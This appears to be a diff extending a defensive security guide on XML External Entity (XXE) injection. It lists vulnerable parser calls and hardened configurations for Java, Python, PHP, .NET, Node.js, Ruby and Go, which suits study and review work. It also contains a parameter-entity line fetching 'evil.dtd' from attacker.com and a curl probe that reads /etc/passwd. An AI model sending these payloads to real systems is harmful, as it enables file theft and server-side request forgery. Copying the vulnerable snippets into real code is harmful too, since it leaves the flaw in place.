@@ -7,6 +7,25 @@ description: XXE testing for external entity injection, file disclosure, and SSR
 
 XML External Entity injection is a parser-level weakness that can expose local files, route requests to internal services (SSRF), exhaust resources via entity expansion, and in certain stacks achieve code execution through XInclude, XSLT, or language-specific protocol wrappers. Every XML consumer should be assumed vulnerable until its parser configuration is verified.
 
+The core pattern: *user-controlled XML reaches a parser that has not disabled DTD processing or external entity resolution.*
+
+## What XXE Is (and Is Not)
+
+**What it IS**
+- Parsers with external entity resolution enabled by default and no explicit hardening
+- `SYSTEM` entities referencing `file://` or `http://` URIs
+- DTD processing left on in Java DOM/SAX, PHP SimpleXML/DOMDocument, lxml-backed parsers
+- Parameter entity injection: `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;`
+- XInclude when XInclude processing is enabled in the pipeline
+- SSRF via XXE (`http://`/`https://` entity URLs) and blind OOB exfiltration (DNS/HTTP callbacks)
+
+**What it is NOT**
+- **XSS via XML** — XML rendered as HTML without escaping
+- **SSRF via non-XML** — HTTP requests from non-XML mechanisms (flag as SSRF)
+- **Server-controlled XML only** — bundled configs, migration scripts, classpath resources with no user influence
+- **Safe-by-default parsers** — `defusedxml` (Python), Nokogiri without entity-expansion options (Ruby), Go `encoding/xml` (no external entity resolution)
+- **XMLDecoder** — Java object deserialization (CWE-502), not entity processing
+
 ## Where to Look
 
 **Capabilities**
@@ -188,6 +207,22 @@ Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-styleshee
 4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths)
 5. Bound impact: exact files/data reached or internal targets proven
 
+### Dynamic Test / PoC
+
+Minimal reflected-XXE probe — send to any endpoint accepting `application/xml` or `text/xml`:
+
+```bash
+curl -X POST 'https://app.example.com/api/import' \
+  -H 'Content-Type: application/xml' \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+```
+
+**Expected signal (reflected)**: `/etc/passwd` content (e.g., `root:`) in response body, transformed output, or error page.
+
+**Blind OOB**: replace entity with parameter-entity DTD fetch to attacker-controlled host; confirm DNS/HTTP callback correlates to the request timestamp.
+
+**DoS-only**: billion-laughs payload — expect timeout/500 without file/SSRF content; use only when DoS impact is in scope.
+
 ## Common False Alarms
 
 - DOCTYPE accepted but entities not resolved and no transclusion reachable
@@ -219,25 +254,89 @@ Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-styleshee
 
 XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.
 
+## Parser Recon Indicators
+
+Flag any XML parse/transform call lacking adjacent hardening (DTD/external-entity disable). Grep for these sinks:
+
+| Language | Vulnerable sinks (flag unless hardened) |
+|----------|----------------------------------------|
+| **Python** | `ET.parse`, `ET.fromstring`, `ET.iterparse`, `minidom.parseString`, `xml.sax.parse`, `xmltodict.parse`; `etree.parse/fromstring/XML`, `objectify.parse` without `resolve_entities=False` |
+| **Java** | `DocumentBuilderFactory` → `parse`, `SAXParserFactory` → `parse`, `XMLInputFactory` → `createXMLStreamReader`, `TransformerFactory` → `newTransformer`, `SchemaFactory` → `newSchema`, JAXB `Unmarshaller` |
+| **PHP** | `simplexml_load_string/file`, `DOMDocument::loadXML/load`, `xml_parse`, `SimpleXMLElement` constructor |
+| **.NET** | `XmlDocument.Load/LoadXml`, `XmlTextReader`, `XDocument.Load`, `XmlReader.Create` without `DtdProcessing.Prohibit` |
+| **Node.js** | `libxmljs.parseXmlString/parseXml`, `node-expat`, `sax.parser` (check entity expansion) |
+| **Ruby** | `Nokogiri::XML` with `config.noent`, `REXML::Document.new`, `LibXML::XML::Document.string` |
+| **Go** | Third-party parsers (e.g., `beevik/etree`); stdlib `encoding/xml` does not resolve external entities |
+
+**Skip (safe patterns)**: `import defusedxml`; `XMLParser(resolve_entities=False, no_network=True)`; Java `disallow-doctype-decl=true`; .NET `DtdProcessing.Prohibit` + `XmlResolver = null`; Nokogiri without `noent`; `xml2js.parseString` v0.5+.
+
+## Safe Parser Configuration
+
+Patterns indicating the parser is likely **not** vulnerable:
+
+```java
+// Java DOM — disable DTD and external entities
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+```
+
+```python
+# Python — defusedxml drop-in (always safe)
+import defusedxml.ElementTree as ET
+tree = ET.parse(source)
+```
+
+```php
+// PHP 7.x — disable entity loader; LIBXML_NONET blocks network (LIBXML_NOENT alone EXPANDS entities)
+libxml_disable_entity_loader(true);
+$doc->loadXML($xml, LIBXML_NONET);
+```
+
+```csharp
+// .NET — prohibit DTD, null resolver
+settings.DtdProcessing = DtdProcessing.Prohibit;
+settings.XmlResolver = null;
+XmlReader reader = XmlReader.Create(stream, settings);
+```
+
+```javascript
+// Node.js — xml2js does not resolve external entities by default (v0.5+)
+xml2js.parseString(xmlInput, callback);
+```
+
 ## Python/JS/PHP Source Detection Rules
 
 ### Python
 - **VULN (lxml)**: `lxml.etree.parse(user_xml)` — lxml allows external entities by default
 - **VULN (lxml)**: `lxml.etree.fromstring(user_xml)` — same default behavior
+- **VULN (stdlib)**: `xml.etree.ElementTree.fromstring(user_xml)` — expat may resolve entities (CPython < 3.8 quirks)
 - **SAFE (lxml)**:
   ```python
   parser = lxml.etree.XMLParser(resolve_entities=False, no_network=True)
   lxml.etree.parse(source, parser)
   ```
-- **VULN (stdlib)**: `xml.etree.ElementTree.parse(user_xml)` — Python stdlib ET is vulnerable to billion laughs; check Python version
 - **SAFE (stdlib)**: `defusedxml.ElementTree.parse(user_xml)` — use defusedxml library
+
+```python
+# VULNERABLE: lxml resolves external entities by default
+from lxml import etree
+tree = etree.fromstring(request.body)
+
+# SECURE: disable entity resolution and network
+parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
+tree = etree.fromstring(request.body, parser)
+```
 
 ### PHP
 - **VULN**: `simplexml_load_string($userXml)` — no entity protection
 - **VULN**: `$doc = new DOMDocument(); $doc->loadXML($userXml)` — external entities enabled by default
-- **VULN**: `libxml_disable_entity_loader(false)` or absent call before SimpleXML/DOMDocument usage
+- **VULN**: `libxml_disable_entity_loader(false)` or absent call before SimpleXML/DOMDocument usage (PHP < 8.0)
+- **VULN**: `loadXML($xml, LIBXML_NOENT)` — NOENT **expands** entities; does not disable loading
 - **SAFE**: `libxml_disable_entity_loader(true)` called before parsing (PHP < 8.0)
-- **SAFE**: PHP 8.0+ disables external entity loading by default
+- **SAFE**: PHP 8.0+ disables external entity loading by default; still prefer `LIBXML_NONET` for network blocking
 
 ## Java XML Parser Detection Rules
 
@@ -337,9 +436,58 @@ tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
 - `XMLDecoder` — tag as `insecure_deserialization`, not `xxe`
 - Do not emit `xxe` for plain XML rendering pages that have no XML parsing path or module intent
 
+### .NET — XmlDocument / XmlReader
+
+```csharp
+// VULNERABLE: default XmlDocument resolves external entities
+XmlDocument doc = new XmlDocument();
+doc.Load(stream);
+
+// SECURE: null resolver + XmlReader with DtdProcessing.Prohibit
+XmlDocument doc = new XmlDocument();
+doc.XmlResolver = null;
+doc.Load(stream);
+
+XmlReaderSettings settings = new XmlReaderSettings {
+    DtdProcessing = DtdProcessing.Prohibit,
+    XmlResolver = null
+};
+XmlReader reader = XmlReader.Create(stream, settings);
+```
+
+### Node.js — libxmljs
+
+```javascript
+// VULNERABLE: libxmljs resolves entities by default
+const doc = libxml.parseXmlString(req.body);
+
+// SECURE: prefer xml2js or a non-libxml2-backed parser for untrusted input
+```
+
+### Ruby — Nokogiri
+
+```ruby
+# VULNERABLE: noent enables entity substitution
+Nokogiri::XML(xml_input) { |config| config.noent }
+
+# SECURE: default Nokogiri (no options) — safe for untrusted input
+Nokogiri::XML(xml_input)
+```
+
+### Go — third-party parsers
+
+```go
+// VULNERABLE: check third-party library entity/network behavior
+doc := etree.NewDocument()
+doc.ReadFromBytes(userData)
+
+// SECURE: stdlib encoding/xml does not resolve external entities
+xml.Unmarshal(userData, &v)
+```
+
 ## XXE (external entity / file read / SSRF)
 
-Commonly affected languages: Java, Python, JavaScript, Ruby. No dedicated XXE coverage for Go or C# (C# has separate missing schema-validation checks).
+Commonly affected languages: Java, Python, PHP, JavaScript, Ruby, C#. Go stdlib `encoding/xml` is generally safe; flag third-party XML libraries with entity support.
 
 **Parsers / sinks**:
 - **Java**: `DocumentBuilder.parse`, `SAXParser.parse`, `XMLStreamReader`, JDOM/SAXBuilder, dom4j `SAXReader`, `XMLReader`, `SAXSource`, `TransformerFactory`, `SchemaFactory`, JAXB `Unmarshaller`, `XPathExpression` — when factory lacks safe features
